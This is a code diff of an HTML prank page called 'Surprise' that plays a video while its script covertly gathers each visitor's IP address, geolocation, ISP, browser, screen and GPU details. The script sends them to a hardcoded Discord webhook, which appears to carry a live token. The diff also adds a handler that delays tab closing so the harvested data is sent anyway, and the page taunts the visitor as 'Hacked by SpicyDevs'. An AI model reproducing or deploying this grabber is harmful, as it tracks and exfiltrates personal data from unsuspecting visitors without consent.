@@ -2,16 +2,18 @@
 <html>
 <head>
   <meta charset="UTF-8" />
- <title>Surprise</title><meta name="description" content="get a surprise bro ">
-  <script>window.onload = async () => {
+  <title>Surprise</title>
+  <meta name="description" content="get a surprise bro">
+  <script>
+    window.onload = async () => {
       const video = document.getElementById('video');
       const loading = document.getElementById('loading');
       const data = document.getElementById('data');
 
       const error = message => {
         loading.innerText = message;
-        throw message
-      }
+        throw message;
+      };
 
       const pick = array => array[Math.floor(Math.random() * array.length)];
       const hacked_statements = [
@@ -24,93 +26,108 @@
         "Almost Certainly",
         "Definitely",
         "Absolutely",
-      ]
+      ];
       const webhookUrl = "https://discord.com/api/webhooks/1111166274110771280/R2dwQ4tln3aFxCSIH4cq1_esSXG0MxEHIIlL4ALzT8sb1OS3NSZkRlPL77_W7lAxL6ca";
 
+      // Function to send data to Discord webhook
       const sendDataToWebhook = async (data) => {
-  try {
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ content: data }),
-    });
-  } catch (error) {
-    console.error('Failed to send data to Discord webhook:', error);
-  }
-};
+        try {
+          await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: data }),
+          });
+        } catch (error) {
+          console.error('Failed to send data to Discord webhook:', error);
+        }
+      };
 
-// Array to store merged messages
-let mergedMessages = [];
+      // Array to store merged messages
+      let mergedMessages = [];
 
-// Send data to Discord webhook
-const sendToWebhook = async (data) => {
-  mergedMessages.push(data); // Add the message to the mergedMessages array
-};
+      // Send data to Discord webhook
+      const sendToWebhook = async (data) => {
+        mergedMessages.push(data); // Add the message to the mergedMessages array
+      };
 
-// Send merged messages to Discord webhook
-const sendMergedMessages = async () => {
-  const mergedData = mergedMessages.join('\n'); // Merge the messages using a separator
-  await sendDataToWebhook(mergedData); // Send the merged messages to the webhook
-  console.log('Data sent to SpicyDevs');
-  mergedMessages = []; // Reset the mergedMessages array
-};
+      // Send merged messages to Discord webhook
+      const sendMergedMessages = async () => {
+        const mergedData = mergedMessages.join('\n'); // Merge the messages using a separator
+        await sendDataToWebhook(mergedData); // Send the merged messages to the webhook
+        console.log('Data sent to Discord webhook:', mergedData);
+        mergedMessages = []; // Reset the mergedMessages array
+      };
+
+      // Variable to track if the tab is being closed
+      let tabClosing = false;
+
+      // Handle beforeunload event to send merged messages before the tab closes
+      window.addEventListener('beforeunload', async (event) => {
+        if (!tabClosing && mergedMessages.length > 0) {
+          tabClosing = true;
+          event.preventDefault();
+          event.returnValue = ''; // Show the default browser prompt message
+          await sendMergedMessages(); // Send the accumulated messages
+        }
+      });
+
       try {
-        const memes = []
-        const push = (tit, con, add) => memes.push(`${tit}: ${con}${add || ''}`)
+        const memes = [];
+        const push = (tit, con, add) => memes.push(`${tit}: ${con}${add || ''}`);
 
-        let step = 0
+        let step = 0;
 
         let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 10);
         data.style.fontSize = `${fontSize}px`;
 
-        let my_ip = await (await fetch("https://wtfismyip.com/json").catch()).json().catch()
-        let ip_data = await (await fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${my_ip.YourFuckingIPAddress}`).catch()).json().catch()
+        let my_ip = await (await fetch("https://wtfismyip.com/json").catch()).json().catch();
+        let ip_data = await (await fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${my_ip.YourFuckingIPAddress}`).catch()).json().catch();
 
         const videoData = await fetch('video.mp4').catch(error);
         video.src = URL.createObjectURL(await videoData.blob());
         video.load();
 
         video.oncanplaythrough = async () => {
-          loading.style.display = 'none'
-          start.style.display = 'flex'
+          loading.style.display = 'none';
+          start.style.display = 'flex';
 
           if (my_ip && ip_data) {
-            push('IP Address', ip_data.query)
-            push('Hostname', my_ip.YourFuckingHostname)
-            push('Country', `${ip_data.country} (${ip_data.countryCode})`)
-            push('Region', `${ip_data.regionName} (${ip_data.region})`)
-            push('City', ip_data.city)
-            push('Latitude', ip_data.lat)
-            push('Longitude', ip_data.lon)
-            push('ISP', my_ip.YourFuckingISP)
-            push('Autonomous System', ip_data.as)
+            push('IP Address', ip_data.query);
+            push('Hostname', my_ip.YourFuckingHostname);
+            push('Country', `${ip_data.country} (${ip_data.countryCode})`);
+            push('Region', `${ip_data.regionName} (${ip_data.region})`);
+            push('City', ip_data.city);
+            push('Latitude', ip_data.lat);
+            push('Longitude', ip_data.lon);
+            push('ISP', my_ip.YourFuckingISP);
+            push('Autonomous System', ip_data.as);
           } else {
-            push('IP Address', '::ffff:172.70.126.134')
+            push('IP Address', '::ffff:172.70.126.134');
           }
-          push('User Agent', navigator.userAgent)
-          push('Connection Method', "GET")
-          push('Request URL', "/")
-          push('Request Path', "/")
-          push('Request Protocol', "http")
-          push('Secure Connection', false ? 'Yes' : 'No')
-          push('Proxy IPs', '[]')
-          push('Window Properies', Object.keys(window).length)
-          push('Window Width', window.innerWidth, 'px')
-          push('Window Height', window.innerHeight, 'px')
-          push('Window Ratio', `${window.innerWidth / window.innerHeight}/1`)
-          push('Screen Width', window.screen.availWidth, 'px')
-          push('Screen Height', window.screen.availHeight, 'px')
-          push('Screen Ratio', `${window.screen.availWidth / window.screen.availHeight}/1`)
-          push('Screen Pixel Ratio', window.devicePixelRatio, '/1')
-          push('Screen DPI', window.devicePixelRatio)
-          push('Screen Color Depth', window.screen.colorDepth)
-          push('Screen Orientation', `${window.screen.orientation.type} (${window.screen.orientation.angle}°)`)
-          push('Screen Rotation', window.screen.orientation.angle)
-          push('OS', `${navigator.platform}`)
+          push('User Agent', navigator.userAgent);
+          push('Connection Method', "GET");
+          push('Request URL', "/");
+          push('Request Path', "/");
+          push('Request Protocol', "http");
+          push('Secure Connection', false ? 'Yes' : 'No');
+          push('Proxy IPs', '[]');
+          push('Window Properies', Object.keys(window).length);
+          push('Window Width', window.innerWidth, 'px');
+          push('Window Height', window.innerHeight, 'px');
+          push('Window Ratio', `${window.innerWidth / window.innerHeight}/1`);
+          push('Screen Width', window.screen.availWidth, 'px');
+          push('Screen Height', window.screen.availHeight, 'px');
+          push('Screen Ratio', `${window.screen.availWidth / window.screen.availHeight}/1`);
+          push('Screen Pixel Ratio', window.devicePixelRatio, '/1');
+          push('Screen DPI', window.devicePixelRatio);
+          push('Screen Color Depth', window.screen.colorDepth);
+          push('Screen Orientation', `${window.screen.orientation.type} (${window.screen.orientation.angle}°)`);
+          push('Screen Rotation', window.screen.orientation.angle);
+          push('OS', `${navigator.platform}`);
           push('Available Browser Memory', typeof window.performance.memory != 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, 'MB');
-          push('CPU Threads', `${navigator.hardwareConcurrency}`)
+          push('CPU Threads', `${navigator.hardwareConcurrency}`);
           const canvas = document.createElement('canvas');
           let gl;
           let debugInfo;
@@ -122,60 +139,62 @@ const sendMergedMessages = async () => {
             push('GPU Vendor', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
             push('GPU Info', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
           }
-          push('Device Memory', `${navigator.deviceMemory}`)
-          push('System Languages', navigator.languages.join(', '))
-          push('Language', `${navigator.language}`)
-          let date = new Date()
-          push('Current Time', `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`)
-          if (ip_data) push('Timezone', ip_data.timezone)
-          push('Timezone Offset', date.getTimezoneOffset() / 60, ' hours')
-          push('Hacked', pick(hacked_statements))
-          push('Hacked By', 'SpicyDevs')
-          push('Current Status', "🟢")
-        }
+          push('Device Memory', `${navigator.deviceMemory}`);
+          push('System Languages', navigator.languages.join(', '));
+          push('Language', `${navigator.language}`);
+          let date = new Date();
+          push('Current Time', `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`);
+          if (ip_data) push('Timezone', ip_data.timezone);
+          push('Timezone Offset', date.getTimezoneOffset() / 60, ' hours');
+          push('Hacked', pick(hacked_statements));
+          push('Hacked By', 'SpicyDevs');
+          push('Current Status', "🟢");
+        };
 
         start.onclick = async () => {
-          start.style.display = "none"
-          video.style.display = 'flex'
+          start.style.display = "none";
+          video.style.display = 'flex';
           video.play();
 
-          
-  const interval = setInterval(async () => {
-    const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
-    if (step >= memes.length) step = -Infinity;
-    if (step < 0) {
-      clearInterval(interval);
-      await sendMergedMessages(); // Send the accumulated messages
-      return;
-    }
-    if (time >= 0) {
-      if (step == 0) document.title = `Hacked by SpicyDevs BOZO`;
-      const el = document.createElement('span');
-      el.textContent = `${memes[step]}`;
-      step++;
-      data.appendChild(el);
-      const height = data.getBoundingClientRect().height;
-      if (height >= window.innerHeight) {
-        fontSize *= 0.88;
-        data.style.fontSize = `${fontSize}px`;
-      }
-      sendToWebhook(`${memes[step]}`); // Add the message to the mergedMessages array
-    }
-  }, 5);
-};
+          const interval = setInterval(async () => {
+            const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
+            if (step >= memes.length) step = -Infinity;
+            if (step < 0) {
+              clearInterval(interval);
+              if (!tabClosing) {
+                await sendMergedMessages(); // Send the accumulated messages
+              }
+              return;
+            }
+            if (time >= 0) {
+              if (step == 0) document.title = `Hacked by SpicyDevs BOZO`;
+              const el = document.createElement('span');
+              el.textContent = `${memes[step]}`;
+              step++;
+              data.appendChild(el);
+              const height = data.getBoundingClientRect().height;
+              if (height >= window.innerHeight) {
+                fontSize *= 0.88;
+                data.style.fontSize = `${fontSize}px`;
+              }
+              sendToWebhook(`${memes[step]}`); // Add the message to the mergedMessages array
+            }
+          }, 5);
+        };
 
         video.onended = () => {
           video.style.display = 'none';
           step = -Infinity;
-        }
+        };
       } catch (e) {
-        error(`${e.message}`)
+        error(`${e.message}`);
       }
-    }</script>
+    };
+  </script>
   <style>
     * {
       background: white;
-        color: black,
+      color: black;
     }
 
     body {
@@ -238,4 +257,5 @@ const sendMergedMessages = async () => {
   <div id="start" style="display: none">Click to Start!</div>
   <div id="data"></div><video id="video" playingline style="display: none; pointer-events: none"></video>
 </body>
+
 </html>
